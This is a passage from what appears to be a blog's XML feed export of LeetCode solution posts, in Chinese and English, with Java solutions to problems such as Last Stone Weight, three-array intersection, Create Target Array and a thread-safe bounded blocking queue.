<h2 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: [2,3,-2,4]</span><br><span class="line">Output: 6</span><br><span class="line">Explanation: [2,3] has the largest product 6.</span><br></pre></td></tr></table></figure>

<h2 id="Example-2："><a href="#Example-2：" class="headerlink" title="Example 2："></a>Example 2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: [-<span class="number">2</span>,<span class="number">0</span>,-<span class="number">1</span>]</span><br><span class="line">Output: <span class="number">0</span></span><br><span class="line">Explanation: The result cannot be <span class="number">2</span>, because [-<span class="number">2</span>,-<span class="number">1</span>] is not a subarray.</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>动态规划</p>
<p>从题目意思来看，它需要求出，连续的子序列的积。那么，假设d[i]为数组第i个数字时的最大乘积。那么它的最大值就是当前值（前一个值为0或者前一个值为负，当前值为正）或者它前一个最大值乘以当前值（前一个值和当前值都为正数）或者它前一个最小值乘以当前值（前一个值为负，当前值为负）</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxProduct</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result = nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">int</span> min = nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">int</span> max = nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>;i &lt; nums.length;i++) &#123;</span><br><span class="line">        	<span class="keyword">int</span> m1 = min;</span><br><span class="line">        	<span class="keyword">int</span> m2 = max;</span><br><span class="line">        	min = Math.min(m1 * nums[i], Math.min(m2 * nums[i], nums[i]));</span><br><span class="line">        	max = Math.max(m1 * nums[i], Math.max(m2 * nums[i], nums[i]));</span><br><span class="line">        	result = Math.max(result, max);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>1046. Last Stone Weight</title>
    <url>/2020/03/24/LeetCode/leetcode-001046.%20Last%20Stone%20Weight/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>We have a collection of rocks, each rock has a positive integer weight.</p>
<p>Each turn, we choose the two <strong>heaviest</strong> rocks and smash them together. Suppose the stones have weights <code>x</code> and <code>y</code> with <code>x &lt;= y</code>. The result of this smash is:</p>
<ul>
<li>If <code>x == y</code>, both stones are totally destroyed;</li>
<li>If <code>x != y</code>, the stone of weight <code>x</code> is totally destroyed, and the stone of weight <code>y</code> has new weight <code>y-x</code>.</li>
</ul>
<p>At the end, there is at most 1 stone left. Return the weight of this stone (or 0 if there are no stones left.)</p>
<h2 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: [2,7,4,1,8,1]</span><br><span class="line">Output: 1</span><br><span class="line">Explanation: </span><br><span class="line">We combine 7 and 8 to get 1 so the array converts to [2,4,1,1,1] then,</span><br><span class="line">we combine 2 and 4 to get 2 so the array converts to [2,1,1,1] then,</span><br><span class="line">we combine 2 and 1 to get 1 so the array converts to [1,1,1] then,</span><br><span class="line">we combine 1 and 1 to get 0 so the array converts to [1] then that&#39;s the value of last stone.</span><br></pre></td></tr></table></figure>

<h2 id="Note："><a href="#Note：" class="headerlink" title="Note："></a>Note：</h2><ul>
<li><code>1 &lt;= stones.length &lt;= 30</code></li>
<li><code>1 &lt;= stones[i] &lt;= 1000</code></li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一：大顶堆"><a href="#解法一：大顶堆" class="headerlink" title="解法一：大顶堆"></a>解法一：大顶堆</h3><p>构造一个大顶堆，每次从该堆中取出两个元素，比较，如果不相同则求出它们的差，重新插入大顶堆。需要注意的是：</p>
<ul>
<li>Java中堆默认是小顶堆，大顶堆需要在初始化的时候传入自定义Comparator；</li>
<li>当堆中最后只剩两个相同元素的时候，返回0</li>
<li>可以采用lambda表达式初始化大顶堆PriorityQueue<Integer> pq = new PriorityQueue&lt;&gt;((a, b) -&gt; b - a)</Integer></li>
<li>也可以用集合的Collections.reverseOrder()方法初始化大顶堆PriorityQueue<Integer> pq = new PriorityQueue&lt;&gt;(Collections.reverseOrder())</Integer></li>
</ul>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">lastStoneWeight</span><span class="params">(<span class="keyword">int</span>[] stones)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (stones.length == <span class="number">1</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> stones[<span class="number">0</span>];</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		PriorityQueue&lt;Integer&gt; nums = <span class="keyword">new</span> PriorityQueue&lt;Integer&gt;(stones.length, <span class="keyword">new</span> Comparator&lt;Integer&gt;() &#123;</span><br><span class="line">			<span class="meta">@Override</span></span><br><span class="line">			<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(Integer o1, Integer o2)</span> </span>&#123;</span><br><span class="line">				<span class="keyword">return</span> o2 - o1;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> stone : stones) &#123;</span><br><span class="line">			nums.add(stone);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">while</span> (nums.size() &gt; <span class="number">1</span>) &#123;</span><br><span class="line">			<span class="keyword">int</span> x = nums.poll();</span><br><span class="line">			<span class="keyword">int</span> y = nums.poll();</span><br><span class="line">			<span class="keyword">if</span> (x &gt; y) &#123;</span><br><span class="line">				nums.add(x - y);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (nums.isEmpty()) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> nums.peek();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>1389. Create Target Array in the Given Order</title>
    <url>/2020/03/24/LeetCode/leetcode-001213-%E4%B8%89%E4%B8%AA%E6%9C%89%E5%BA%8F%E6%95%B0%E7%BB%84%E7%9A%84%E4%BA%A4%E9%9B%86/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给出三个均为 <strong>严格递增排列</strong> 的整数数组 <code>arr1</code>，<code>arr2</code> 和 <code>arr3</code>。</p>
<p>返回一个由 <strong>仅</strong> 在这三个数组中 <strong>同时出现</strong> 的整数所构成的有序数组。</p>
<h2 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: arr1 &#x3D; [1,2,3,4,5], arr2 &#x3D; [1,2,5,7,9], arr3 &#x3D; [1,3,4,5,8]</span><br><span class="line">输出: [1,5]</span><br><span class="line">解释: 只有 1 和 5 同时在这三个数组中出现.</span><br></pre></td></tr></table></figure>

<h2 id="提示"><a href="#提示" class="headerlink" title="提示:"></a>提示:</h2><ul>
<li>1 &lt;= arr1.length, arr2.length, arr3.length &lt;= 1000</li>
<li>1 &lt;= arr1[i], arr2[i], arr3[i] &lt;= 2000</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>三指针</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">arraysIntersection</span><span class="params">(<span class="keyword">int</span>[] arr1, <span class="keyword">int</span>[] arr2, <span class="keyword">int</span>[] arr3)</span> </span>&#123;</span><br><span class="line">		List&lt;Integer&gt; res = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">		<span class="keyword">int</span> arr1Index = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">int</span> arr2Index = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">int</span> arr3Index = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">while</span> (arr1Index &lt; arr1.length &amp;&amp; arr2Index &lt; arr2.length &amp;&amp; arr3Index &lt; arr3.length) &#123;</span><br><span class="line">			<span class="keyword">if</span> (arr1[arr1Index] == arr2[arr2Index] &amp;&amp; arr2[arr2Index] == arr3[arr3Index]) &#123;</span><br><span class="line">				res.add(arr1[arr1Index]);</span><br><span class="line">				arr1Index++;</span><br><span class="line">				arr2Index++;</span><br><span class="line">				arr3Index++;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">/// 最小值往后移动</span></span><br><span class="line">			<span class="keyword">int</span> minVal = Math.min(Math.min(arr1[arr1Index], arr2[arr2Index]), arr3[arr3Index]);</span><br><span class="line">			<span class="keyword">if</span> (arr1[arr1Index] == minVal) &#123;</span><br><span class="line">				arr1Index++;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (arr2[arr2Index] == minVal) &#123;</span><br><span class="line">				arr2Index++;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (arr3[arr3Index] == minVal) &#123;</span><br><span class="line">				arr3Index++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> res;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>计数</p>
<p>因为题目限制了值最大不会超过2000。那么就可以声明一个2001长度的数组。</p>
<p>如果一个数字在每个数组中都出现过，那么，它的计数一定是3</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public List&lt;Integer&gt; arraysIntersection(int[] arr1, int[] arr2, int[] arr3) &#123;</span><br><span class="line">		List&lt;Integer&gt; result &#x3D; new ArrayList&lt;&gt;();</span><br><span class="line">		</span><br><span class="line">		int[] count &#x3D; new int[2001];</span><br><span class="line">		count(arr1, count);</span><br><span class="line">		count(arr2, count);</span><br><span class="line">		count(arr3, count);</span><br><span class="line">		</span><br><span class="line">		for (int i &#x3D; 0;i &lt; count.length;i++) &#123;</span><br><span class="line">			if (3 &#x3D;&#x3D; count[i]) &#123;</span><br><span class="line">				result.add(i);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		return result;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	private void count(int[] array, int[] count) &#123;</span><br><span class="line">		for (int num : array) &#123;</span><br><span class="line">			count[num]++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>1389. Create Target Array in the Given Order</title>
    <url>/2020/03/24/LeetCode/leetcode-001389.%20Create%20Target%20Array%20in%20the%20Given%20Order/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given two arrays of integers <code>nums</code> and <code>index</code>. Your task is to create <em>target</em> array under the following rules:</p>
<ul>
<li>Initially <em>target</em> array is empty.</li>
<li>From left to right read nums[i] and index[i], insert at index <code>index[i]</code> the value <code>nums[i]</code> in <em>target</em> array.</li>
<li>Repeat the previous step until there are no elements to read in <code>nums</code> and <code>index.</code></li>
</ul>
<p>Return the <em>target</em> array.</p>
<p>It is guaranteed that the insertion operations will be valid.</p>
<h2 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: nums &#x3D; [0,1,2,3,4], index &#x3D; [0,1,2,2,1]</span><br><span class="line">Output: [0,4,1,3,2]</span><br><span class="line">Explanation:</span><br><span class="line">nums       index     target</span><br><span class="line">0            0        [0]</span><br><span class="line">1            1        [0,1]</span><br><span class="line">2            2        [0,1,2]</span><br><span class="line">3            2        [0,1,3,2]</span><br><span class="line">4            1        [0,4,1,3,2]</span><br></pre></td></tr></table></figure>

<h2 id="Example-2"><a href="#Example-2" class="headerlink" title="Example 2:"></a>Example 2:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: nums &#x3D; [1,2,3,4,0], index &#x3D; [0,1,2,3,0]</span><br><span class="line">Output: [0,1,2,3,4]</span><br><span class="line">Explanation:</span><br><span class="line">nums       index     target</span><br><span class="line">1            0        [1]</span><br><span class="line">2            1        [1,2]</span><br><span class="line">3            2        [1,2,3]</span><br><span class="line">4            3        [1,2,3,4]</span><br><span class="line">0            0        [0,1,2,3,4]</span><br></pre></td></tr></table></figure>

<h2 id="Example-3"><a href="#Example-3" class="headerlink" title="Example 3:"></a>Example 3:</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: nums = [<span class="number">1</span>], index = [<span class="number">0</span>]</span><br><span class="line">Output: [<span class="number">1</span>]</span><br></pre></td></tr></table></figure>

<h2 id="Constraints"><a href="#Constraints" class="headerlink" title="Constraints:"></a>Constraints:</h2><ul>
<li><code>1 &lt;= nums.length, index.length &lt;= 100</code></li>
<li><code>nums.length == index.length</code></li>
<li><code>0 &lt;= nums[i] &lt;= 100</code></li>
<li><code>0 &lt;= index[i] &lt;= i</code></li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>利用ArrayList的add(int index, int value)方法，即可实现在对应位置上插入对应的值</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] createTargetArray(<span class="keyword">int</span>[] nums, <span class="keyword">int</span>[] index) &#123;</span><br><span class="line">        ArrayList&lt;Integer&gt; result = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nums.length;i++) &#123;</span><br><span class="line">        	result.add(index[i], nums[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result.stream().mapToInt(a -&gt; a).toArray();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>ArrayList每次在指定位置上插入对应的数据之后，其后面的数据还要整体往后挪动，效率不高，可以考虑用LinkedList替换，它插入只是指针操作，可以在O(1)的时间内完成。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] createTargetArray(<span class="keyword">int</span>[] nums, <span class="keyword">int</span>[] index) &#123;</span><br><span class="line">        LinkedList&lt;Integer&gt; result = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nums.length;i++) &#123;</span><br><span class="line">        	result.add(index[i], nums[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result.stream().mapToInt(a -&gt; a).toArray();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>1188. 设计有限阻塞队列</title>
    <url>/2020/03/24/LeetCode/leetcode-1188.-%E8%AE%BE%E8%AE%A1%E6%9C%89%E9%99%90%E9%98%BB%E5%A1%9E%E9%98%9F%E5%88%97/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>实现一个拥有如下方法的线程安全有限阻塞队列：</p>
<pre><code>BoundedBlockingQueue(int capacity) 构造方法初始化队列，其中capacity代表队列长度上限。
void enqueue(int element) 在队首增加一个element. 如果队列满，调用线程被阻塞直到队列非满。
int dequeue() 返回队尾元素并从队列中将其删除. 如果队列为空，调用线程被阻塞直到队列非空。
int size() 返回当前队列元素个数。</code></pre><p>你的实现将会被多线程同时访问进行测试。每一个线程要么是一个只调用enqueue方法的生产者线程，要么是一个只调用dequeue方法的消费者线程。size方法将会在每一个测试用例之后进行调用。</p>
<p>请不要使用内置的有限阻塞队列实现，否则面试将不会通过。</p>
<h2 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入:</span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line">[&quot;BoundedBlockingQueue&quot;,&quot;enqueue&quot;,&quot;dequeue&quot;,&quot;dequeue&quot;,&quot;enqueue&quot;,&quot;enqueue&quot;,&quot;enqueue&quot;,&quot;enqueue&quot;,&quot;dequeue&quot;]</span><br><span class="line">[[2],[1],[],[],[0],[2],[3],[4],[]]</span><br><span class="line"></span><br><span class="line">输出:</span><br><span class="line">[1,0,2,2]</span><br><span class="line"></span><br><span class="line">解释:</span><br><span class="line">生产者线程数目 &#x3D; 1</span><br><span class="line">消费者线程数目 &#x3D; 1</span><br><span class="line"></span><br><span class="line">BoundedBlockingQueue queue &#x3D; new BoundedBlockingQueue(2);   &#x2F;&#x2F; 使用capacity &#x3D; 2初始化队列。</span><br><span class="line"></span><br><span class="line">queue.enqueue(1);   &#x2F;&#x2F; 生产者线程将1插入队列。</span><br><span class="line">queue.dequeue();    &#x2F;&#x2F; 消费者线程调用dequeue并返回1。</span><br><span class="line">queue.dequeue();    &#x2F;&#x2F; 由于队列为空，消费者线程被阻塞。</span><br><span class="line">queue.enqueue(0);   &#x2F;&#x2F; 生产者线程将0插入队列。消费者线程被解除阻塞同时将0弹出队列并返回。</span><br><span class="line">queue.enqueue(2);   &#x2F;&#x2F; 生产者线程将2插入队列。</span><br><span class="line">queue.enqueue(3);   &#x2F;&#x2F; 生产者线程将3插入队列。</span><br><span class="line">queue.enqueue(4);   &#x2F;&#x2F; 生产者线程由于队列长度已达到上限2而被阻塞。</span><br><span class="line">queue.dequeue();    &#x2F;&#x2F; 消费者线程将2从队列弹出并返回。生产者线程解除阻塞同时将4插入队列。</span><br><span class="line">queue.size();       &#x2F;&#x2F; 队列中还有2个元素。size()方法在每组测试用例最后调用。</span><br></pre></td></tr></table></figure>

<h2 id="示例2"><a href="#示例2" class="headerlink" title="示例2:"></a>示例2:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入:</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">[&quot;BoundedBlockingQueue&quot;,&quot;enqueue&quot;,&quot;enqueue&quot;,&quot;enqueue&quot;,&quot;dequeue&quot;,&quot;dequeue&quot;,&quot;dequeue&quot;,&quot;enqueue&quot;]</span><br><span class="line">[[3],[1],[0],[2],[],[],[],[3]]</span><br><span class="line"></span><br><span class="line">输出:</span><br><span class="line">[1,0,2,1]</span><br><span class="line"></span><br><span class="line">解释:</span><br><span class="line">生产者线程数目 &#x3D; 3</span><br><span class="line">消费者线程数目 &#x3D; 4</span><br><span class="line"></span><br><span class="line">BoundedBlockingQueue queue &#x3D; new BoundedBlockingQueue(3);   &#x2F;&#x2F; 使用capacity &#x3D; 3初始化队列。</span><br><span class="line"></span><br><span class="line">queue.enqueue(1);   &#x2F;&#x2F; 生产者线程P1将1插入队列。</span><br><span class="line">queue.enqueue(0);   &#x2F;&#x2F; 生产者线程P2将0插入队列。</span><br><span class="line">queue.enqueue(2);   &#x2F;&#x2F; 生产者线程P3将2插入队列。</span><br><span class="line">queue.dequeue();    &#x2F;&#x2F; 消费者线程C1调用dequeue。</span><br><span class="line">queue.dequeue();    &#x2F;&#x2F; 消费者线程C2调用dequeue。</span><br><span class="line">queue.dequeue();    &#x2F;&#x2F; 消费者线程C3调用dequeue。</span><br><span class="line">queue.enqueue(3);   &#x2F;&#x2F; 其中一个生产者线程将3插入队列。</span><br><span class="line">queue.size();       &#x2F;&#x2F; 队列中还有1个元素。</span><br><span class="line"></span><br><span class="line">由于生产者&#x2F;消费者线程的数目可能大于1，我们并不知道线程如何被操作系统调度，即使输入看上去隐含了顺序。因此任意一种输出[1,0,2]或[1,2,0]或[0,1,2]或[0,2,1]或[2,0,1]或[2,1,0]都可被接受。</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>同步方法块</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BoundedBlockingQueue</span> </span>&#123;</span><br><span class="line">		<span class="keyword">private</span> <span class="keyword">int</span> capacity;</span><br><span class="line">		<span class="keyword">private</span> LinkedList&lt;Integer&gt; values;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="title">BoundedBlockingQueue</span><span class="params">(<span class="keyword">int</span> capacity)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">this</span>.capacity = capacity;</span><br><span class="line">			values = <span class="keyword">new</span> LinkedList&lt;Integer&gt;();</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">enqueue</span><span class="params">(<span class="keyword">int</span> element)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">			<span class="keyword">while</span> (<span class="keyword">this</span>.capacity == values.size()) &#123;</span><br><span class="line">				<span class="comment">// 队列已满</span></span><br><span class="line">				<span class="keyword">this</span>.wait();</span><br><span class="line">			&#125;</span><br><span class="line">			values.add(element);</span><br><span class="line">			<span class="keyword">this</span>.notifyAll();</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">int</span> <span class="title">dequeue</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">			<span class="keyword">while</span> (<span class="number">0</span> == values.size()) &#123;</span><br><span class="line">				<span class="keyword">this</span>.wait();</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">int</span> value = values.removeFirst();</span><br><span class="line">			<span class="keyword">this</span>.notifyAll();</span><br><span class="line">			<span class="keyword">return</span> value;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">int</span> <span class="title">size</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">return</span> values.size();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>ReentrantLock+Condition</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.LinkedList;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.atomic.AtomicInteger;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.locks.Condition;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.locks.ReentrantLock;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BoundedBlockingQueue</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//原子类保证原子性，也可以使用volatile</span></span><br><span class="line">    <span class="comment">//普通的int被读取，会被读入内存的缓存中，完成加减乘除后再放回内存中，而每一个线程都有自己的寄存器，这样子会导致可能读取不到最新的数据</span></span><br><span class="line">    <span class="comment">//volatile则可以直接在主内存读写，当一个线程更新了值，其他线程能够及时获知。</span></span><br><span class="line">    AtomicInteger size = <span class="keyword">new</span> AtomicInteger(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">volatile</span> <span class="keyword">int</span> capacity;</span><br><span class="line">    <span class="comment">//自己实现阻塞队列，需要一个容器，内部实现了一个node，如果改造为不只是int的，使用T泛型</span></span><br><span class="line">    <span class="keyword">private</span> LinkedList&lt;Integer&gt; container;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//可重入锁</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> ReentrantLock lock = <span class="keyword">new</span> ReentrantLock();</span><br><span class="line">    Condition procuder = lock.newCondition();<span class="comment">//用来通知生产（入队）线程等待await还是可以执行signal</span></span><br><span class="line">    Condition consumer = lock.newCondition();<span class="comment">//用来通知消费（出队）线程等待await还是可以执行signal</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">BoundedBlockingQueue</span><span class="params">(<span class="keyword">int</span> capacity)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.capacity = capacity;</span><br><span class="line">        container = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 入队</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> element</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> InterruptedException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">enqueue</span><span class="params">(<span class="keyword">int</span> element)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        <span class="comment">//每一个线程都会获得锁，但是如果条件不满足则会阻塞</span></span><br><span class="line">        lock.lock();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//阻塞的话必须用循环，让这个线程再次获得cpu片段的时候能够够执行</span></span><br><span class="line">            <span class="keyword">while</span> (size.get() &gt;= capacity) &#123;</span><br><span class="line">                <span class="comment">//入队线程阻塞，把锁释放？</span></span><br><span class="line">                procuder.await();</span><br><span class="line">            &#125;</span><br><span class="line">            container.addFirst(element);</span><br><span class="line">            size.incrementAndGet();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//通知出队线程</span></span><br><span class="line">            consumer.signal();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            lock.unlock();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">dequeue</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        lock.lock();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">while</span> (size.get() == <span class="number">0</span>) &#123;</span><br><span class="line">                consumer.await();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">int</span> lastValue = container.getLast();</span><br><span class="line">            container.removeLast();</span><br><span class="line">            size.decrementAndGet();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//通知入队线程</span></span><br><span class="line">            procuder.signal();</span><br><span class="line">            <span class="keyword">return</span> lastValue;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            lock.unlock();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">size</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        lock.lock();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> size.get();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            lock.unlock();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>多线程</tag>
        <tag>BlockingQueue</tag>
      </tags>
  </entry>
  <entry>
    <title>Lock和Condition的应用</title>
